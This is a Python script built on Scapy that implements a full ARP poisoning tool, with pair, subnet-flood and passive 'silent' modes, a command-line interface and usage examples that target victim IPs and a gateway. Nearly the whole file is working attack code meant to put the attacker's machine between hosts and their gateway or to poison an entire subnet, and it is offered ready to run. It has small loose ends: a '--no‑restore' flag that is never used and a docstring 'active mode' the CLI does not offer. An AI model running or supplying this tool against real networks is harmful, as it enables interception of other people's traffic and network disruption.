#!/usr/bin/env python3
"""

* **Pair mode**      – poison one or more <victim, gateway> pairs (default).
* **Flood mode**     – claim every IP of a CIDR is at the attacker’s MAC.
* **Silent mode**    – answer only when ARP requests are heard (stealthy).
* **Active mode**    – send forged replies every *interval* seconds.
* Graceful clean‑up: correct ARP entries are restored on Ctrl‑C.
* Threaded design – you can mix pair lists, flood, silent, etc.

    sudo python3 arp_poisoner_fully_fledged.py \
        --iface enp0s10 \
        --victims 10.0.123.4,10.0.123.7 \
        --gateway 10.0.123.1 \
        --interval 4               # active mode (default)

    sudo python3 arp_poisoner_fully_fledged.py \
        --iface enp0s10 \
        --mode flood \
        --cidr 10.0.123.0/24       # poison whole /24 every 10 s

    sudo python3 arp_poisoner_fully_fledged.py \
        --iface enp0s10 \
        --mode silent \
        --victims 10.0.123.4 --gateway 10.0.123.1
"""

import ipaddress
import logging
import signal
import threading
import time
from typing import List, Tuple

from scapy.all import (
    ARP,
    Ether,
    conf,
    get_if_hwaddr,
    getmacbyip,
    sendp,
    sniff,
)

logging.basicConfig(
    format="[%(levelname).1s] %(message)s",
    level=logging.INFO,
)
log = logging.getLogger("arp")

Pair = Tuple[str, str]  # (ip, mac)


# ---------------------------------------------------------------------------
# Helper functions
# ---------------------------------------------------------------------------

def craft(is_at_mac: str, dst_ip: str, dst_mac: str, src_ip: str):
    """Return one forged Ethernet/ARP *reply* frame."""
    return Ether(src=is_at_mac, dst=dst_mac) / ARP(
        op=2,  # is‑at
        psrc=src_ip,
        hwsrc=is_at_mac,
        pdst=dst_ip,
        hwdst=dst_mac,
    )


def resolve_mac(ip: str) -> str:
    mac = getmacbyip(ip)
    if not mac:
        raise RuntimeError(f"Could not resolve MAC for {ip} – host down?")
    return mac


# ---------------------------------------------------------------------------
# Thread classes
# ---------------------------------------------------------------------------
class ActivePairSpoofer(threading.Thread):
    """Periodically poisons exactly one <victim, gateway> pair."""

    def __init__(
        self,
        iface: str,
        victim: Pair,
        gateway: Pair,
        attacker_mac: str,
        interval: float = 10.0,
    ):
        super().__init__(daemon=True)
        self.iface = iface
        self.victim = victim
        self.gateway = gateway
        self.attacker_mac = attacker_mac
        self.interval = interval
        self._run = True

    # -----------------------------------------
    def _spoof_once(self):
        v_ip, v_mac = self.victim
        g_ip, g_mac = self.gateway

        # "I am the gateway"  → victim
        sendp(craft(self.attacker_mac, v_ip, v_mac, g_ip), iface=self.iface, verbose=False)
        # "I am the victim"   → gateway
        sendp(craft(self.attacker_mac, g_ip, g_mac, v_ip), iface=self.iface, verbose=False)

    def _restore_once(self):
        v_ip, v_mac = self.victim
        g_ip, g_mac = self.gateway
        # Push the *real* MACs back (5× each)
        sendp(craft(g_mac, v_ip, v_mac, g_ip), iface=self.iface, count=5, inter=0.2, verbose=False)
        sendp(craft(v_mac, g_ip, g_mac, v_ip), iface=self.iface, count=5, inter=0.2, verbose=False)

    # -----------------------------------------
    def run(self):
        log.info("[pair %s ↔ %s] active poisoning started", self.victim[0], self.gateway[0])
        while self._run:
            self._spoof_once()
            time.sleep(self.interval)
        self._restore_once()

    def stop(self):
        self._run = False


class FloodSpoofer(threading.Thread):
    """Send forged replies for *all* IPs in a CIDR (gateway IP substituted)."""

    def __init__(self, iface: str, cidr: str, gateway_ip: str, attacker_mac: str, interval: float = 10):
        super().__init__(daemon=True)
        self.iface = iface
        self.cidr = ipaddress.ip_network(cidr, strict=False)
        self.gateway_ip = gateway_ip
        self.attacker_mac = attacker_mac
        self.interval = interval
        self._run = True

    def _spoof_once(self):
        for ip in self.cidr.hosts():
            sendp(
                craft(self.attacker_mac, str(ip), "ff:ff:ff:ff:ff:ff", self.gateway_ip),
                iface=self.iface,
                verbose=False,
            )

    def run(self):
        log.info("[flood %s] poisoning whole subnet…", self.cidr)
        while self._run:
            self._spoof_once()
            time.sleep(self.interval)

    def stop(self):
        self._run = False  # no restore; ARP caches will age out naturally


class SilentResponder(threading.Thread):
    """Passive: answer incoming ARP requests with forged replies."""

    def __init__(self, iface: str, victim: Pair, gateway: Pair, attacker_mac: str):
        super().__init__(daemon=True)
        self.iface = iface
        self.victim = victim
        self.gateway = gateway
        self.attacker_mac = attacker_mac
        self._run = True

    def _handle(self, pkt):
        if not pkt.haslayer(ARP) or pkt[ARP].op != 1:  # who‑has only
            return
        dst_ip = pkt[ARP].pdst
        src_ip = pkt[ARP].psrc
        v_ip, v_mac = self.victim
        g_ip, g_mac = self.gateway

        # Victim asking for gateway → lie
        if src_ip == v_ip and dst_ip == g_ip:
            sendp(craft(self.attacker_mac, v_ip, v_mac, g_ip), iface=self.iface, verbose=False)
        # Gateway asking for victim → lie
        elif src_ip == g_ip and dst_ip == v_ip:
            sendp(craft(self.attacker_mac, g_ip, g_mac, v_ip), iface=self.iface, verbose=False)

    def run(self):
        log.info("[pair %s ↔ %s] silent responder active", self.victim[0], self.gateway[0])
        sniff(iface=self.iface, filter="arp", prn=self._handle, store=0, stop_filter=lambda *_: not self._run)

    def stop(self):
        self._run = False


# ---------------------------------------------------------------------------
# Orchestrator
# ---------------------------------------------------------------------------
class PoisonManager:
    def __init__(self):
        self.threads: List[threading.Thread] = []

    def add(self, t: threading.Thread):
        self.threads.append(t)
        t.start()

    def stop_all(self, *_):
        log.info("Stopping… restoring caches where applicable.")
        for t in self.threads:
            if hasattr(t, "stop"):
                t.stop()
        for t in self.threads:
            t.join()


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="ARP poisoning / spoofing tool (Scapy)")

    parser.add_argument("--iface", "-i", required=True, help="Network interface")

    # pair mode options
    parser.add_argument("--victims", help="Comma‑separated victim IPs (pair modes)")
    parser.add_argument("--gateway", help="Gateway IP (pair modes)")

    # flood mode options
    parser.add_argument("--cidr", help="CIDR to flood, e.g. 10.0.0.0/24")

    # common options
    parser.add_argument("--mode", choices=["pair", "flood", "silent"], default="pair")
    parser.add_argument("--interval", type=float, default=10.0, help="Seconds between bursts (active modes)")
    parser.add_argument("--no‑restore", action="store_true", help="Skip restoring ARP caches on exit (pair modes)")

    args = parser.parse_args()

    attacker_mac = get_if_hwaddr(args.iface)
    manager = PoisonManager()

    try:
        if args.mode in ("pair", "silent"):
            if not (args.victims and args.gateway):
                parser.error("--victims and --gateway are required for pair/silent modes")

            victim_ips = [ip.strip() for ip in args.victims.split(",")]
            gateway_ip = args.gateway
            gateway_mac = resolve_mac(gateway_ip)

            for vip in victim_ips:
                vmac = resolve_mac(vip)
                if args.mode == "pair":
                    t = ActivePairSpoofer(
                        iface=args.iface,
                        victim=(vip, vmac),
                        gateway=(gateway_ip, gateway_mac),
                        attacker_mac=attacker_mac,
                        interval=args.interval,
                    )
                else:  # silent
                    t = SilentResponder(
                        iface=args.iface,
                        victim=(vip, vmac),
                        gateway=(gateway_ip, gateway_mac),
                        attacker_mac=attacker_mac,
                    )
                manager.add(t)

        elif args.mode == "flood":
            if not args.cidr or not args.gateway:
                parser.error("--cidr and --gateway are required for flood mode")
            t = FloodSpoofer(
                iface=args.iface,
                cidr=args.cidr,
                gateway_ip=args.gateway,
                attacker_mac=attacker_mac,
                interval=args.interval,
            )
            manager.add(t)

        # handle Ctrl‑C
        signal.signal(signal.SIGINT, manager.stop_all)

        # wait until all threads exit
        for th in manager.threads:
            th.join()

    except Exception as e:
        log.error(str(e))
        manager.stop_all()
